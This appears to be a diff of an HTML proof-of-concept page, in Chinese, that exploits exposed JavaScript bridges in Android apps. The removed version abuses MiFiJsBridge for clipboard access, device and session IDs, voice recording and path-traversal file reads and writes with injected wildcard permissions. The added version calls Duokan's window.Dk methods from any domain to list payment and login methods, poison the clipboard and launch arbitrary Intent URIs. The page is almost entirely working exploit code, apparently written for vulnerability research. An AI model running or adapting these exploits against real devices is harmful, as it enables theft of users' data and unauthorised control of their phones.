@@ -2,258 +2,154 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>xm_car bridge debug bypass PoC</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Duokan Bridge 任意域调用 PoC</title>
   <style>
-    :root { --bg:#0b0f14; --card:#121922; --line:#2b3645; --txt:#d7e1ee; --muted:#97a8bf; --ok:#22c55e; --btn:#1f2937; }
-    * { box-sizing: border-box; }
-    body { margin: 0; padding: 14px; background: var(--bg); color: var(--txt); font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif; }
-    h1,h2 { margin: 0 0 8px; }
-    .desc { color: var(--muted); margin-bottom: 12px; }
-    .grid { display: grid; gap: 12px; }
-    .box { border: 1px solid var(--line); background: var(--card); border-radius: 12px; padding: 12px; }
-    input, textarea, select, button { width: 100%; border-radius: 8px; border: 1px solid var(--line); background: #0f1620; color: var(--txt); padding: 8px; }
-    textarea { min-height: 110px; font-family: ui-monospace, Consolas, Menlo, monospace; }
-    button { background: var(--btn); cursor: pointer; }
-    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-    .row3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
-    pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
-    .hint { color: var(--muted); font-size: 12px; }
-    .ok { color: var(--ok); }
+    body{font-family:Arial,Helvetica,sans-serif;background:#f5f7fb;margin:0;padding:16px;color:#111}
+    .card{max-width:980px;margin:0 auto;background:#fff;border-radius:12px;box-shadow:0 4px 18px rgba(0,0,0,.08);padding:16px}
+    h1{margin:0 0 8px;font-size:22px}
+    .muted{color:#666;font-size:13px}
+    .row{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
+    input,textarea{width:100%;padding:9px;border:1px solid #d7dce6;border-radius:8px;box-sizing:border-box}
+    textarea{min-height:72px;resize:vertical}
+    button{padding:10px 14px;border:0;border-radius:8px;background:#1677ff;color:#fff;cursor:pointer}
+    button.gray{background:#6b7280}
+    pre{background:#0b1020;color:#d7e2ff;padding:12px;border-radius:8px;min-height:180px;white-space:pre-wrap;word-break:break-all}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    @media (max-width:900px){.grid{grid-template-columns:1fr}}
   </style>
 </head>
 <body>
-  <h1>xm_car 导出链路 -> JR Bridge 验证 PoC</h1>
-  <div class="desc">要求：页面 URL 带 <code>_debug=true</code>。例如：<code>https://your-domain/poc_xmcar_bridge.html?_debug=true</code></div>
+<div class="card">
+  <h1>Duokan 任意第三方页面 Bridge 调用 PoC</h1>
+  <div class="muted">目标：验证 exported deep link 拉起后，任意域页面可直接调用 <code>window.Dk</code> 高权限接口（无需 Hook 参与利用）。</div>
+
+  <div class="row">
+    <button onclick="checkBridge()">检测 Dk 对象</button>
+    <button onclick="call0('getCurrentEnv')">getCurrentEnv</button>
+    <button onclick="call0('getClientInfo')">getClientInfo</button>
+    <button onclick="call0('getQtDeviceId')">getQtDeviceId</button>
+    <button onclick="call0('listLoginMethods')">listLoginMethods</button>
+    <button onclick="call0('listPaymentMethods')">listPaymentMethods</button>
+  </div>
 
   <div class="grid">
-    <div class="box">
-      <h2>0) 环境检查</h2>
-      <div class="hint">先点“快速检查”，确认 lookup 全是 code=0</div>
-      <div class="row">
-        <button id="btnEnv">显示环境</button>
-        <button id="btnQuick">快速检查</button>
-      </div>
+    <div>
+      <label>查询包信息（getPackageInfo）</label>
+      <input id="pkg" value="com.tencent.mobileqq" />
+      <div class="row"><button onclick="getPkgInfo()">调用 getPackageInfo</button></div>
     </div>
-
-    <div class="box">
-      <h2>1) 剪贴板</h2>
-      <input id="clipText" value="xm_car_pwn_clipboard" />
-      <div class="row">
-        <button id="btnReadClip">System.readClipboard</button>
-        <button id="btnWriteClip">System.writeClipboard</button>
-      </div>
-    </div>
-
-    <div class="box">
-      <h2>2) 设备标识</h2>
-      <button id="btnData">Data.getDeviceId / getSessionId / getDeviceInfo</button>
-    </div>
-
-    <div class="box">
-      <h2>3) 任意文件读写（Storage）</h2>
-      <label>读取路径（相对 filesDir，可 ../ 穿越）</label>
-      <input id="readPath" value="../shared_prefs/hybrid_storage.xml" />
-      <label>读取格式</label>
-      <select id="readFmt">
-        <option value="0" selected>0 (text)</option>
-        <option value="1">1 (base64)</option>
-      </select>
-      <div class="row3">
-        <button id="btnInject">仅注入元数据</button>
-        <button id="btnReadNoMeta">直接 loadFile</button>
-        <button id="btnReadWithMeta">注入后 loadFile</button>
-      </div>
-      <hr style="border-color:#2b3645; margin: 10px 0;" />
-      <label>写入路径</label>
-      <input id="writePath" value="../shared_prefs/poc_xmcar_test.xml" />
-      <label>写入格式</label>
-      <select id="writeFmt">
-        <option value="0" selected>0 (text)</option>
-        <option value="1">1 (base64)</option>
-      </select>
-      <label>写入内容</label>
-      <textarea id="writeData"><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
-<map>
-  <string name='poc'>xm_car_bridge_ok</string>
-</map></textarea>
-      <button id="btnWrite">Storage.saveFile</button>
-    </div>
-
-    <div class="box">
-      <h2>4) 其他能力</h2>
-      <div class="row">
-        <button id="btnPhone">Account.getPhoneNumber (可能 202)</button>
-        <button id="btnVoiceStart">Voice.startRecord</button>
-      </div>
-      <div class="row">
-        <button id="btnVoiceStop">Voice.stopRecord</button>
-        <button id="btnVoiceCancel">Voice.cancelRecord</button>
-      </div>
-      <div class="hint">Account.getPhoneNumber 在非 MIUI 签名环境可能返回 code=202（代码里有签名限制）。</div>
-    </div>
-
-    <div class="box">
-      <h2>输出</h2>
-      <pre id="out"></pre>
+    <div>
+      <label>剪贴板投毒（clipText）</label>
+      <input id="clip" value="Duokan_Bridge_PoC_Clipboard" />
+      <div class="row"><button onclick="setClipboard()">写入剪贴板</button></div>
     </div>
   </div>
 
+  <div class="grid">
+    <div>
+      <label>本地存储（lsSetItem / lsGetItem）Key</label>
+      <input id="lsKey" value="poc_key" />
+      <label style="display:block;margin-top:6px;">Value</label>
+      <textarea id="lsVal">poc_value_123</textarea>
+      <div class="row">
+        <button onclick="lsSet()">lsSetItem</button>
+        <button onclick="lsGet()">lsGetItem</button>
+        <button class="gray" onclick="lsDel()">lsRemoveItem</button>
+      </div>
+    </div>
+    <div>
+      <label>外跳 URL（openOutUrl）</label>
+      <input id="outUrl" value="https://www.baidu.com" />
+      <div class="row"><button onclick="openOutUrl()">openOutUrl</button></div>
+
+      <label style="display:block;margin-top:10px;">任意 Intent URI（openIntentWithUri）</label>
+      <textarea id="intentUri">intent:#Intent;action=android.settings.SETTINGS;end</textarea>
+      <div class="row"><button onclick="openIntentUri()">openIntentWithUri</button></div>
+    </div>
+  </div>
+
+  <div class="row">
+    <button class="gray" onclick="dumpEnv()">打印页面环境</button>
+    <button class="gray" onclick="clearLog()">清空日志</button>
+  </div>
+
+  <pre id="log"></pre>
+</div>
+
 <script>
-  const out = document.getElementById('out');
-  const now = () => new Date().toLocaleTimeString();
-  const log = (x) => {
-    const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
-    out.textContent += `[${now()}] ${s}\n`;
-    out.scrollTop = out.scrollHeight;
-  };
-  const j = (raw) => { try { return JSON.parse(raw); } catch { return raw; } };
+function log(s){
+  const el=document.getElementById('log');
+  el.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
+}
+function clearLog(){ document.getElementById('log').textContent=''; }
+function dumpEnv(){
+  log('location=' + location.href);
+  log('origin=' + location.origin);
+  log('ua=' + navigator.userAgent);
+}
+function hasDk(){ return typeof window.Dk !== 'undefined'; }
+function checkBridge(){
+  log('window.Dk exists = ' + hasDk());
+  if(!hasDk()) return;
+  try{
+    const keys = Object.getOwnPropertyNames(Object.getPrototypeOf(window.Dk) || {});
+    log('Dk proto methods(sample)=' + keys.slice(0,30).join(','));
+  }catch(e){ log('enum Dk methods fail: ' + e); }
+}
+function safeCall(fn){
+  try{ return fn(); }catch(e){ return 'EXCEPTION: ' + e; }
+}
+function call0(name){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const ret = safeCall(()=>window.Dk[name]());
+  log(`${name} => ${typeof ret==='string'?ret:JSON.stringify(ret)}`);
+}
+function getPkgInfo(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const p=document.getElementById('pkg').value.trim();
+  const ret = safeCall(()=>window.Dk.getPackageInfo(p));
+  log(`getPackageInfo(${p}) => ${ret}`);
+}
+function setClipboard(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const t=document.getElementById('clip').value;
+  const ret = safeCall(()=>window.Dk.clipText(t));
+  log(`clipText(len=${t.length}) => ${ret}`);
+}
+function lsSet(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const k=document.getElementById('lsKey').value;
+  const v=document.getElementById('lsVal').value;
+  const ret = safeCall(()=>window.Dk.lsSetItem(k,v,true));
+  log(`lsSetItem(${k}) => ${ret}`);
+}
+function lsGet(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const k=document.getElementById('lsKey').value;
+  const ret = safeCall(()=>window.Dk.lsGetItem(k));
+  log(`lsGetItem(${k}) => ${ret}`);
+}
+function lsDel(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const k=document.getElementById('lsKey').value;
+  const ret = safeCall(()=>window.Dk.lsRemoveItem(k));
+  log(`lsRemoveItem(${k}) => ${ret}`);
+}
+function openOutUrl(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const u=document.getElementById('outUrl').value.trim();
+  const ret = safeCall(()=>window.Dk.openOutUrl(u));
+  log(`openOutUrl(${u}) => ${ret}`);
+}
+function openIntentUri(){
+  if(!hasDk()){ log('Dk not found'); return; }
+  const u=document.getElementById('intentUri').value.trim();
+  const ret = safeCall(()=>window.Dk.openIntentWithUri(u));
+  log(`openIntentWithUri(${u}) => ${ret}`);
+}
 
-  function ensureBridge() {
-    if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge 不存在');
-  }
-
-  function invoke(feature, action, param, cb) {
-    ensureBridge();
-    const raw = window.MiFiJsBridge.invoke(feature, action, param ?? null, cb ?? null);
-    return j(raw);
-  }
-
-  function lookup(feature, action) {
-    ensureBridge();
-    return window.MiFiJsBridge.lookup(feature, action);
-  }
-
-  function mkCb(tag) {
-    const fn = `__xmcar_cb_${tag}_${Date.now()}_${Math.floor(Math.random()*10000)}`;
-    window[fn] = (respRaw) => log({ callback: fn, data: j(respRaw) });
-    return `window.${fn}`;
-  }
-
-  function setMeta(path, format) {
-    const meta = JSON.stringify({ authorities: ['*'], format: Number(format) });
-    const req = JSON.stringify({ pref: 'hybrid_storage', content: { [path]: meta } });
-    return invoke('Storage', 'setPreferenceV2', req);
-  }
-
-  document.getElementById('btnEnv').onclick = () => {
-    try {
-      ensureBridge();
-      log({
-        ok: 'MiFiJsBridge exists',
-        href: location.href,
-        has_debug: /[?&]_debug=true(&|$)/.test(location.href),
-        ua: navigator.userAgent
-      });
-    } catch (e) { log('ERR(env): ' + e.message); }
-  };
-
-  document.getElementById('btnQuick').onclick = () => {
-    try {
-      const checks = [
-        ['System','readClipboard'],
-        ['System','writeClipboard'],
-        ['Data','getDeviceId'],
-        ['Data','getSessionId'],
-        ['Data','getDeviceInfo'],
-        ['Storage','setPreferenceV2'],
-        ['Storage','loadFile'],
-        ['Storage','saveFile'],
-        ['Voice','startRecord']
-      ];
-      const result = {};
-      checks.forEach(([f,a]) => result[`${f}.${a}`] = lookup(f,a));
-      log(result);
-    } catch (e) { log('ERR(quick): ' + e.message); }
-  };
-
-  document.getElementById('btnReadClip').onclick = () => {
-    try { log({ readClipboard: invoke('System','readClipboard', null) }); }
-    catch (e) { log('ERR(readClipboard): ' + e.message); }
-  };
-
-  document.getElementById('btnWriteClip').onclick = () => {
-    try {
-      const text = document.getElementById('clipText').value;
-      log({ writeClipboard: invoke('System','writeClipboard', text) });
-    } catch (e) { log('ERR(writeClipboard): ' + e.message); }
-  };
-
-  document.getElementById('btnData').onclick = () => {
-    try {
-      log({
-        getDeviceId: invoke('Data','getDeviceId', null),
-        getSessionId: invoke('Data','getSessionId', null),
-        getDeviceInfo: invoke('Data','getDeviceInfo', null)
-      });
-    } catch (e) { log('ERR(data): ' + e.message); }
-  };
-
-  document.getElementById('btnInject').onclick = () => {
-    try {
-      const p = document.getElementById('readPath').value.trim();
-      const f = document.getElementById('readFmt').value;
-      log({ injectMeta: setMeta(p, f), path: p, format: Number(f) });
-    } catch (e) { log('ERR(injectMeta): ' + e.message); }
-  };
-
-  document.getElementById('btnReadNoMeta').onclick = () => {
-    try {
-      const p = document.getElementById('readPath').value.trim();
-      log({ loadFile: invoke('Storage','loadFile', p) });
-    } catch (e) { log('ERR(readNoMeta): ' + e.message); }
-  };
-
-  document.getElementById('btnReadWithMeta').onclick = () => {
-    try {
-      const p = document.getElementById('readPath').value.trim();
-      const f = document.getElementById('readFmt').value;
-      log({ injectMeta: setMeta(p, f) });
-      const r = invoke('Storage','loadFile', p);
-      log({ loadFile: r });
-      if (Number(f) === 1 && r && r.code === 0 && r.content?.data) {
-        try { log('base64 decoded bytes=' + atob(r.content.data).length); } catch {}
-      }
-    } catch (e) { log('ERR(readWithMeta): ' + e.message); }
-  };
-
-  document.getElementById('btnWrite').onclick = () => {
-    try {
-      const name = document.getElementById('writePath').value.trim();
-      const data = document.getElementById('writeData').value;
-      const format = Number(document.getElementById('writeFmt').value);
-      const req = JSON.stringify({ name, data, format, authorities: ['*'] });
-      log({ saveFile: invoke('Storage','saveFile', req), name, format });
-    } catch (e) { log('ERR(write): ' + e.message); }
-  };
-
-  document.getElementById('btnPhone').onclick = () => {
-    try {
-      const cb = mkCb('phone');
-      const r = invoke('Account','getPhoneNumber', null, cb);
-      log({ getPhoneNumber_return: r, callback: cb });
-    } catch (e) { log('ERR(phone): ' + e.message); }
-  };
-
-  document.getElementById('btnVoiceStart').onclick = () => {
-    try {
-      const cb = mkCb('voice');
-      const r = invoke('Voice','startRecord', 'xm_car_voice', cb);
-      log({ startRecord_return: r, callback: cb });
-    } catch (e) { log('ERR(voiceStart): ' + e.message); }
-  };
-
-  document.getElementById('btnVoiceStop').onclick = () => {
-    try { log({ stopRecord: invoke('Voice','stopRecord', null) }); }
-    catch (e) { log('ERR(voiceStop): ' + e.message); }
-  };
-
-  document.getElementById('btnVoiceCancel').onclick = () => {
-    try { log({ cancelRecord: invoke('Voice','cancelRecord', null) }); }
-    catch (e) { log('ERR(voiceCancel): ' + e.message); }
-  };
-
-  log('PoC loaded. 先点“显示环境”和“快速检查”。');
+window.addEventListener('load',()=>{ dumpEnv(); checkBridge(); });
 </script>
 </body>
 </html>
